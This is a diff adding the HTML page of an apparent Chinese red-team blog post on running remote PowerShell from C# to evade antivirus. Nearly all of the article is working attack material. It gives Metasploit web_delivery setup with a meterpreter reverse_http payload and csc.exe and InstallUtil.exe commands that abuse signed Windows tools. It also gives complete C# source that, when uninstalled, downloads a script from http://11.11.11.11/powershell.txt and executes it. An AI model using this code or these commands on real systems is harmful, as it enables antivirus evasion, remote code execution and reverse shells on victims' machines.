@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="一般直接执行powershell会被大多数杀毒软件拦截，利用c# Pipeline 执行远程powershell来绕过杀毒软件 参考来源:tsscyber 12345678use multi/script/web_deliveryset payload windows/x64/meterpreter/reverse_httpset target 2...run -j...c:\Windows\Mi">
+<meta name="keywords" content="redteam 红队">
+<meta property="og:type" content="article">
+<meta property="og:title" content="c# 远程执行命令">
+<meta property="og:url" content="http://wolvez.club/2019/08/27/remote-exec-powershell/index.html">
+<meta property="og:site_name" content="wolvez&#39;s blog">
+<meta property="og:description" content="一般直接执行powershell会被大多数杀毒软件拦截，利用c# Pipeline 执行远程powershell来绕过杀毒软件 参考来源:tsscyber 12345678use multi/script/web_deliveryset payload windows/x64/meterpreter/reverse_httpset target 2...run -j...c:\Windows\Mi">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-28T13:13:40.830Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="c# 远程执行命令">
+<meta name="twitter:description" content="一般直接执行powershell会被大多数杀毒软件拦截，利用c# Pipeline 执行远程powershell来绕过杀毒软件 参考来源:tsscyber 12345678use multi/script/web_deliveryset payload windows/x64/meterpreter/reverse_httpset target 2...run -j...c:\Windows\Mi">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon_wolv.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon_wolv.ico" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_wolv.ico">
+          
+        
+    
+    <!-- title -->
+    <title>c# 远程执行命令</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/08/29/mssql-Tips/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/05/25/fiddler-app/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2019/08/27/remote-exec-powershell/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&text=c# 远程执行命令"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&title=c# 远程执行命令"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&is_video=false&description=c# 远程执行命令"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=c# 远程执行命令&body=Check out this article: http://wolvez.club/2019/08/27/remote-exec-powershell/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&title=c# 远程执行命令"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&title=c# 远程执行命令"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&title=c# 远程执行命令"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&title=c# 远程执行命令"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&name=c# 远程执行命令&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        c# 远程执行命令
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">lostwolf</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-08-26T16:00:00.000Z" itemprop="datePublished">2019-08-27</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/redteam-红队/">redteam 红队</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>一般直接执行powershell会被大多数杀毒软件拦截，利用<code>c#</code> <strong>Pipeline</strong> 执行远程powershell来绕过杀毒软件</p>
+<p><a href="https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997" target="_blank" rel="noopener">参考来源:tsscyber</a></p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> target <span class="number">2</span></span><br><span class="line">...</span><br><span class="line">run -j</span><br><span class="line">...</span><br><span class="line"><span class="function">c:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework64</span>\<span class="title">v4</span>.0.30319\<span class="title">csc.exe</span> /<span class="title">r:c</span>:\<span class="title">Windows</span>\<span class="title">assembly</span>\<span class="title">GAC_MSIL</span>\<span class="title">System.Management.Automation</span>\1.0.0.0__31bf3856ad364e35\<span class="title">System.Management.Automation.dll</span> /<span class="title">unsafe</span> /<span class="title">platform:anycpu</span> /<span class="title">out:ps</span>.<span class="title">exe</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework64</span>\<span class="title">v4</span>.0.30319\<span class="title">InstallUtil.exe</span> /<span class="title">logfile</span>= /<span class="title">LogToConsole</span>=<span class="title">True</span> /<span class="title">u</span> .\<span class="title">ps.exe</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Configuration.Install;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">using System.Management.Automation.Runspaces;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Program</span><br><span class="line"> &#123;</span><br><span class="line"> public static void Main()</span><br><span class="line"> &#123;</span><br><span class="line">	 //Console.WriteLine(<span class="string">"test"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> [System.ComponentModel.RunInstaller(true)]</span><br><span class="line"> public class Sample : System.Configuration.Install.Installer</span><br><span class="line"> &#123;</span><br><span class="line"> public override void Uninstall(System.Collections.IDictionary savedState)</span><br><span class="line"> &#123;</span><br><span class="line"> Mycode.Exec();</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> public class Mycode</span><br><span class="line"> &#123;</span><br><span class="line"> public static void Exec()</span><br><span class="line"> &#123;</span><br><span class="line">WebClient client = new WebClient();</span><br><span class="line">//远程执行命令</span><br><span class="line">Stream stream = client.OpenRead(<span class="string">"http://11.11.11.11/powershell.txt"</span>);</span><br><span class="line">StreamReader reader = new StreamReader(stream);</span><br><span class="line">String command = reader.ReadToEnd();</span><br><span class="line">//Console.WriteLine(text);</span><br><span class="line"></span><br><span class="line"> //string command = System.IO.File.ReadAllText(text);</span><br><span class="line"> RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();</span><br><span class="line"> Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);</span><br><span class="line"> rspace.Open();</span><br><span class="line"> Pipeline pipeline = rspace.CreatePipeline();</span><br><span class="line"> pipeline.Commands.AddScript(command);</span><br><span class="line"> pipeline.InvokeAsync();</span><br><span class="line">	<span class="keyword">while</span>(pipeline.PipelineStateInfo.State == PipelineState.Running || pipeline.PipelineStateInfo.State == PipelineState.Stopping) &#123;</span><br><span class="line">		System.Threading.Thread.Sleep(<span class="number">50</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	Console.WriteLine(<span class="string">"startasdfasdfasdf"</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">foreach</span> (object item <span class="keyword">in</span> pipeline.Output.ReadToEnd())</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span>(item != null) &#123;</span><br><span class="line">            Console.WriteLine(item.ToString());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">foreach</span> (object item <span class="keyword">in</span> pipeline.Error.ReadToEnd())</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span>(item != null) &#123;</span><br><span class="line">            Console.WriteLine(item.ToString());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2019/08/27/remote-exec-powershell/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&text=c# 远程执行命令"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&title=c# 远程执行命令"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&is_video=false&description=c# 远程执行命令"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=c# 远程执行命令&body=Check out this article: http://wolvez.club/2019/08/27/remote-exec-powershell/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&title=c# 远程执行命令"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&title=c# 远程执行命令"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&title=c# 远程执行命令"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&title=c# 远程执行命令"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2019/08/27/remote-exec-powershell/&name=c# 远程执行命令&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 wolvez
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
